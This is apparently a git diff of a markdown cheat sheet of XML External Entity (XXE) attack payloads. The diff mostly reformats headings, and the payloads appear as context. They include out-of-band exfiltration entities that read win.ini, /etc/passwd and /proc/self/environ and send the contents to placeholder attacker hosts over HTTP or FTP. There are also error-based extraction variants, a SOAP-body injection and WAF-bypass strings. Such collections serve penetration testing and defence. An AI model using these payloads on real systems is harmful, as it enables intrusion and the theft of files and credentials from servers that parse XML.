@@ -2,7 +2,8 @@
 
 From:<https://gist.githubusercontent.com/staaldraad/01415b990939494879b4/raw/25cff41582552aee47b06526d568f5785af67deb/XXE_payloads> 
 
-### Vanilla, used to verify outbound xxe or blind xxe
+## Vanilla, used to verify outbound xxe or blind xxe
+
 ```
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -12,7 +13,8 @@ From:<https://gist.githubusercontent.com/staaldraad/01415b990939494879b4/raw/25c
 <r>&sp;</r>
 ```
 
-### OoB extraction
+## OoB extraction
+
 ```
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -25,12 +27,14 @@ From:<https://gist.githubusercontent.com/staaldraad/01415b990939494879b4/raw/25c
 ```
 
 External dtd:
+
 ```
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
 ```
 
-### OoB variation of above (seems to work better against .NET)
+## OoB variation of above (seems to work better against .NET)
+
 ```
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -41,13 +45,16 @@ External dtd:
 %exfil;
 ]>
 ```
+
 External dtd:
+
 ```
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
 ```
 
-### OoB extraction
+## OoB extraction
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE r [
@@ -58,12 +65,15 @@ External dtd:
 %exfil;
 ]>
 ```
+
 External dtd:
+
 ```
 <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">
 ```
 
-### OoB extra ERROR -- Java
+## OoB extra ERROR -- Java
+
 ```
 <?xml version="1.0"?>
 <!DOCTYPE r [
@@ -75,12 +85,15 @@ External dtd:
 ]>
 <r></r>
 ```
+
 External dtd:
+
 ```
 <!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
 ```
 
-### OoB extra nice
+## OoB extra nice
+
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
@@ -94,11 +107,13 @@ External dtd:
 ```
 
 External dtd:
+
 ```
 <!ENTITY all "%start;%stuff;%end;">
 ```
 
-### File-not-found exception based extraction
+## File-not-found exception based extraction
+
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [  
@@ -108,14 +123,18 @@ External dtd:
   %four;
 ]>
 ```
+
 External dtd:
+
 ```
 <!ENTITY % three SYSTEM "file:///etc/passwd">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
 ```
+
 * You might need to encode this % (depends on your target) as: `&#x25;`
 
-### FTP
+## FTP
+
 ```
 <?xml version="1.0" ?>
 <!DOCTYPE a [ 
@@ -125,21 +144,24 @@ External dtd:
 ]>
 <a>&rrr;</a>
 ```
+
 External dtd:
+
 ```
 <!ENTITY % d SYSTEM "file:///proc/self/environ">
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
 ```
 
-### Inside SOAP body
+## Inside SOAP body
+
 ```
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 ```
 
-### Untested - WAF Bypass
+## Untested - WAF Bypass
+
 ```
 <!DOCTYPE :. SYTEM "http://"
 <!DOCTYPE :_-_: SYTEM "http://"
 <!DOCTYPE {0xdfbf} SYSTEM "http://"
 ```
-
